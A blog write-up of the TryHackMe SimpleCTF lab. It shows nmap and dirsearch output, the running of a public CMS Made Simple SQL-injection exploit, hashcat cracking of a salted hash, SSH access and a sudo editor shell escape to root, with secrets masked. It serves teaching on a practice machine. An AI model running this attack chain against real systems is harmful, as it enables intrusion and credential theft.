---
title: THM SimpleCTF Hints, Writeup &#038; Notes
author: Mr Ash
type: "post"
published: 2022-07-03
lastUpdated: 2022-11-05
url: "/simplectf/"
image: https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOgk7L/6dc9e187-9662-420f-83d7-ba0b4a67686f.png?v=7de273bf70a0f5146bdf4c12478d6361
categories: Cyber
tags:
  - Hacking
  - TryHackMe
  - Capture The Flag
  - Walkthrough
---

Welcome back to [TryHackMe](https://tryhackme.com/), this time it’s [SimpleCTF](https://tryhackme.com/room/easyctf)… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.

Let’s dive into it.

<!-- <figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper"><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="450" loading="lazy" src="https://www.youtube.com/embed/bWVXSoBoAk4?feature=oembed" title="SimpleCTF Walkthrough THM" width="800"></iframe></div></figure><div id="hs-embed-container" style="position:relative;display:flex;width:100%;height:600px;"><div id="hs-embed-placeholder" style="position:absolute;top:0;bottom:0;left:0;right:0;margin:10px;overflow:auto;font-size: 14px !important">## [ Listen: SimpleCTF Walkthrough THM – powered by Happy Scribe](https://www.happyscribe.com/?utm_source=embed-player&utm_term=cf0f9007980c47a2bdb42aee378367de "Listen: SimpleCTF Walkthrough THM was transcribed from audio to text using Happy Scribe") -->

<!-- </div><div class="hs-embed" data-hide_video="true" data-id="cf0f9007980c47a2bdb42aee378367de" data-private_text="true"></div><script>
var js=document.createElement('script');js.type='text/javascript';js.async=true;js.src='https://embed.happyscribe.co/main.js';document.head.appendChild(js);
</script></div><style type="text/css"> ._h1s512 { white-space: nowrap; } </style> -->

## Hints
- How many services are running under port 1000? `nmap`
- What is running on the higher port? Check the `nmap` scan results.
- What’s the CVE you’re using against the application? `CVE-****-****` don’t forget to include `CVE-` at the beginning.
- To what kind of vulnerability is the application vulnerable? `***i` something injection…?
- What’s the password? `hashcat <hash> <wordlist>.txt`
- Where can you log in with the details obtained? Check your `nmap` results again.
- What’s the user flag? `ls` and `cat` what you find.
- Is there any other user in the home directory? What’s its name? `cat /home/`
- What can you leverage to spawn a privileged shell? Check what can be run with `sudo -*`.
- What’s the root flag? `cat /root/root.txt`

<!-- <div class="elementor elementor-5483" data-elementor-id="5483" data-elementor-type="section"><div class="elementor-section-wrap"> <section class="elementor-section elementor-top-section elementor-element elementor-element-32d8c94 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="32d8c94" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5e7c56e" data-element_type="column" data-id="5e7c56e"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"> <section class="elementor-section elementor-inner-section elementor-element elementor-element-fc64076 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="fc64076" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-no"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-f7d6b37" data-element_type="column" data-id="f7d6b37"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"><div class="elementor-element elementor-element-4c75247 elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="4c75247" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">Recent Posts

 </div> </div> </div><div class="elementor-element elementor-element-322ad34 elementor-widget elementor-widget-elementskit-post-list" data-element_type="widget" data-id="322ad34" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="elementskit-post-list.default"><div class="elementor-widget-container"><div class="ekit-wid-con">- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">How To Fix TryHackMe VPN Not Working | Troubleshooting OpenVPN</span> </div> ](https://mrash.co/how-to-fix-tryhackme-vpn-not-working-troubleshooting-openvpn/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">Crack The Hash TryHackMe Walkthrough</span> </div> ](https://mrash.co/crack-the-hash-tryhackme-walkthrough/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">100 Days Of Hacking</span> </div> ](https://mrash.co/100daysofhacking/)
 
 </div> </div> </div> </div> </div> </div> </div> </div> </section> <section class="elementor-section elementor-inner-section elementor-element elementor-element-d91d33b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="d91d33b" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-no"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-6dee180" data-element_type="column" data-id="6dee180"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"><div class="elementor-element elementor-element-7acfc36 elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="7acfc36" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">Popular Posts

 </div> </div> </div><div class="elementor-element elementor-element-7b9396d elementor-widget elementor-widget-elementskit-post-list" data-element_type="widget" data-id="7b9396d" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="elementskit-post-list.default"><div class="elementor-widget-container"><div class="ekit-wid-con">- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">OneNote to Notion - Moving Apps</span> </div> ](https://mrash.co/onenote-to-notion-moving-apps/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">100 Days Of Hacking</span> </div> ](https://mrash.co/100daysofhacking/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">Hackers Learning Path</span> </div> ](https://mrash.co/learning-path-for-beginner-hacker/)
 
 </div> </div> </div> </div> </div> </div> </div> </div> </section><div class="elementor-element elementor-element-2763e2a elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="2763e2a" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">\*Shamless self-promotion, I know.

 </div> </div> </div> </div> </div> </div> </div> </div> </section> </div> </div> -->

## Steps

1. Enumeration as always, start with `nmap -vv -A <ip>`. With ports 21, 80, and 2222 open, we can see what we can find logging into ftp via anonymous via `ftp <ip>`. I didn’t find anything but checking out other writeups, it looks like my THM VM didn’t work as intended. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOL784/7113721d-e1e0-4831-9ae8-91efb0d1b77c.jpeg?v=4538363f6feb6a7e24f0c9dc88a2ee9c](https://p146.p4.n0.cdn.getcloudapp.com/items/v1uOL784/7113721d-e1e0-4831-9ae8-91efb0d1b77c.jpeg?v=4538363f6feb6a7e24f0c9dc88a2ee9c)

2. More enumeration, since we have a website, let’s navigate to `http://<ip>` and see what we can find. After manually searching, not a lot there, let’s use `dirsearch -u http://<ip>` to find `/simple/` directory. Navigating to `http://<ip>/simple`, we can find a system called ‘CMS Made Simple’ or CMSMS for short. Find the exploit using `locate 'php/webapps/*****.py'`, then make a copy using `cp /usr/share/exploitdb/exploits/php/webapps/*****.py .` 

![https://p146.p4.n0.cdn.getcloudapp.com/items/RBumyjpZ/8fbe854c-6f61-4e58-9574-7bd77b8ee8eb.jpeg?v=2a6edc2faadc68365fbfd0cdfc500b11](https://p146.p4.n0.cdn.getcloudapp.com/items/RBumyjpZ/8fbe854c-6f61-4e58-9574-7bd77b8ee8eb.jpeg?v=2a6edc2faadc68365fbfd0cdfc500b11) 

![https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGR9J/330665a7-bbf1-41c6-b102-bfdea8d214ec.jpeg?v=5d0cc838a21d5e50239766e7e0c4880f](https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGR9J/330665a7-bbf1-41c6-b102-bfdea8d214ec.jpeg?v=5d0cc838a21d5e50239766e7e0c4880f) 

![https://p146.p4.n0.cdn.getcloudapp.com/items/6quzEl4d/6aeb90bd-4b8e-44da-8452-d2bbd49a2c36.jpeg?v=e0e0ab85aa0e87cf6188cc57314fc9e3](https://p146.p4.n0.cdn.getcloudapp.com/items/6quzEl4d/6aeb90bd-4b8e-44da-8452-d2bbd49a2c36.jpeg?v=e0e0ab85aa0e87cf6188cc57314fc9e3)

3. Getting the exploit working, now, this took a bit of time and this makes me call it ‘Not So SimpleCTF’… the correct CVE exploit is written in Python 2 with missing modules that are working in Python3. To fix this, run `sudo apt install 2to3`, then `2to3 *****.py`, this will convert the exploit from Python 2 to Python 3. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/NQulx00O/e0a7b30d-5ba9-4988-b248-1388071276d6.jpeg?v=1a05e098109581641687f3ac5598d3bc](https://p146.p4.n0.cdn.getcloudapp.com/items/NQulx00O/e0a7b30d-5ba9-4988-b248-1388071276d6.jpeg?v=1a05e098109581641687f3ac5598d3bc) 

![https://p146.p4.n0.cdn.getcloudapp.com/items/4gurZqq9/4459e9cc-f33c-4e45-bd71-0043678129ff.jpeg?v=c26cf4059e2adb43c82ec2f0c4fc3073](https://p146.p4.n0.cdn.getcloudapp.com/items/4gurZqq9/4459e9cc-f33c-4e45-bd71-0043678129ff.jpeg?v=c26cf4059e2adb43c82ec2f0c4fc3073)

4. Using the exploit by running `python *****.py -u http://<ip>/simple`, note this took me twice to get the correct results. I tried a third time and the resulted varied, so you are warned, try a few times to make sure you get consistent results. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGRRv/47ebc687-d013-4c8b-935b-c88e4bfe4f66.jpeg?v=b72d7237c17451d2db2c0bdd83bd3d96](https://p146.p4.n0.cdn.getcloudapp.com/items/JruoGRRv/47ebc687-d013-4c8b-935b-c88e4bfe4f66.jpeg?v=b72d7237c17451d2db2c0bdd83bd3d96) 

![https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2](https://p146.p4.n0.cdn.getcloudapp.com/items/kpu8428g/d56f6ace-eb3e-43e5-a402-490dbc1ff3bb.jpeg?v=c6572056b97da622ef551af4c6e6eae2)

5. Crack the password, use `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`. To explain, `-m 20` sets `hashcat` to `md5` with `salt:hash` which is perfect from the exploit we ran. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/L1uXWAAW/fa83ac46-712b-4f91-a726-fac1096fd944.jpeg?v=920a291fba73ca19b65152880a8867bf](https://p146.p4.n0.cdn.getcloudapp.com/items/L1uXWAAW/fa83ac46-712b-4f91-a726-fac1096fd944.jpeg?v=920a291fba73ca19b65152880a8867bf)

6. Access via `ssh`, run `ssh mitch@10.10.44.147 -p 2222`, don’t forget to specify the port number from the earlier `nmap` scan. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/DOudmZZr/ddd4e2be-e6c2-4283-971a-62f187630d4f.jpeg?v=0adb7d12cdaa4dab850c89953d81dc60](https://p146.p4.n0.cdn.getcloudapp.com/items/DOudmZZr/ddd4e2be-e6c2-4283-971a-62f187630d4f.jpeg?v=0adb7d12cdaa4dab850c89953d81dc60)

7. Lastly, escalate privileges, now like other steps, this isn’t so simple either, but do your best to not cheat and search around. I’ll give you a hint, you can use a certain text editor as `sudo` which can spawn a bash shell with `:!bash`. 

![https://p146.p4.n0.cdn.getcloudapp.com/items/p9uOXJJ2/9bdd5af5-1810-4116-9ec7-10a6d2ac4788.jpeg?v=853151cc53a27778e2160ff0207ee930](https://p146.p4.n0.cdn.getcloudapp.com/items/p9uOXJJ2/9bdd5af5-1810-4116-9ec7-10a6d2ac4788.jpeg?v=853151cc53a27778e2160ff0207ee930)

## Reflection

This was a fun CTF from [MrSeth6797](https://tryhackme.com/p/MrSeth6797) ([Twitter](https://twitter.com/0xSeth), [Website](https://floreaiulianpfa.com/), [Writeup](https://floreaiulianpfa.com/simple-ctf/)), I would recommend this to any fellow hacking beginner. I think the basics are always important, this reinforced the importance of searching for known vulns and exploits. And also how exploits can be a bit finicky, like needing to convert the exploit from Python 2 to 3.

I use to get a bit annoyed by rooms like this, where it wasn’t clear with things like this. But after a bit more learning, this is how technology is. Things change, the creator of that exploit wrote it in Python 2, I assume at the time Python 3 wasn’t around. So fast forward to now, our Linux systems have both Python 2 and 3, but modules might only work with 3, not 2.

So yeah, all these sorts of issues become less frustrating the more I learn, and it just becomes a part of the process. I’m also leaning into writeups and the THM Discord more and more. I’ve spent too long banging my head against the wall and going off track. It’s all a part of learning, but writeups can be used in a way that you don’t need to see all the answers, scrolling is a thing.

SimpleCTF is a good, solid CTF from THM, like I said, not so Simple, but in the end, it’s worthwhile. This is day 51 of [\#100DaysOfHacking](https://mrashleyball.com/100daysofhacking/) on my [Hackers Learning Path](https://mrashleyball.com/learning-path-for-beginner-hacker/). [Subscribe](https://go.mrash.co/newsletter) for [CyberSec](https://mrashleyball.com/starting-out-in-cyber-security/) updates or [read](https://mrashleyball.com/blog) more, happy hacking/coding/learning.

## Notes

openvpn issues, in folder w/ ovpn file

```python
sed -i 's/cipher AES-256-CBC/data-ciphers AES-256-CBC/' *.ovpn
```

nmap scan: `nmap -vv -A <ip>`

```bash
Completed NSE at 17:35, 0.00s elapsed
Nmap scan report for 10.10.138.218
Host is up, received syn-ack (0.29s latency).
Scanned at 2022-07-02 17:34:56 EDT for 56s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.33.98
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.

```

dirsearch: `dirsearch -u http://<ip>`

```bash
dirsearch -u <http://10.10.138.218>

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.138.218/_22-07-02_18-08-57.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-07-02_18-08-57.log

Target: <http://10.10.138.218/>

[18:08:58] Starting: 
[18:09:09] 403 -  299B  - /.ht_wsr.txt                                     
[18:09:09] 403 -  302B  - /.htaccess.bak1
[18:09:09] 403 -  304B  - /.htaccess.sample
[18:09:09] 403 -  302B  - /.htaccess.orig
[18:09:09] 403 -  302B  - /.htaccess.save
[18:09:09] 403 -  303B  - /.htaccess_extra
[18:09:09] 403 -  302B  - /.htaccess_orig
[18:09:09] 403 -  300B  - /.htaccess_sc
[18:09:09] 403 -  300B  - /.htaccessBAK
[18:09:09] 403 -  300B  - /.htaccessOLD
[18:09:09] 403 -  301B  - /.htaccessOLD2
[18:09:09] 403 -  292B  - /.htm                                            
[18:09:09] 403 -  293B  - /.html
[18:09:09] 403 -  302B  - /.htpasswd_test
[18:09:09] 403 -  298B  - /.htpasswds
[18:09:09] 403 -  299B  - /.httr-oauth
[18:09:12] 403 -  292B  - /.php                                            
[18:10:12] 200 -   11KB - /index.html                                       
[18:10:34] 200 -  929B  - /robots.txt                                       
[18:10:35] 403 -  301B  - /server-status                                    
[18:10:35] 403 -  302B  - /server-status/                                   
**[18:10:37] 301 -  315B  - /simple  ->  <http://10.10.138.218/simple/**>         
                                                                             
Task Completed

```

Find CVE: `searchsploit ‘CMS Made Simple’`

```bash
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/*****.py

```

Find local CVE file: `locate 'php/webapps/*****.py'`

```bash
/usr/share/exploitdb/exploits/php/webapps/*****.py
```

[🔗 CVE](https://www.exploit-db.com/exploits/46635)

Using CVE:

- Ran `sudo apt install 2to3` – exploit written in `python2` has missing modules.
- `2to3 *****.py`, `python *****.py -u http://<ip>/simple` Note, tried multiple times and then randomly worked… didn’t change anything, ghost in shell moment.
- Also, took two attempts to get correct salt and hash, third attempt again produced different set.

```bash
[+] Salt for password found: *****
[+] Username found: *****
[+] Email found: *****
[+] Password found: *****
```

Crack Password: `hashcat -O -a 0 -m 20 '<salt>:<hash>' <wordlist>.txt --show`

- Note, salt first, then hashed password, used hint for wordlist.

Connect: `ssh *****@<ip> -p 2222`

PrivEsc: `sudo -*`

```bash
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/*******
```

Escalate shell: `sudo ***`, `:!bash`, `cat /root/root.txt`

Thanks for reading and I hope you learned something from this little exercise. This is day 52 of [\#100DaysOfHacking](https://mrashleyball.com/100daysofhacking/) on the [Hackers Learning Path](https://mrashleyball.com/learning-path-for-beginner-hacker/). [Subscribe](https://go.mrash.co/newsletter) for [CyberSec](https://mrashleyball.com/starting-out-in-cyber-security/) updates or [read](https://mrashleyball.com/blog) more, happy hacking.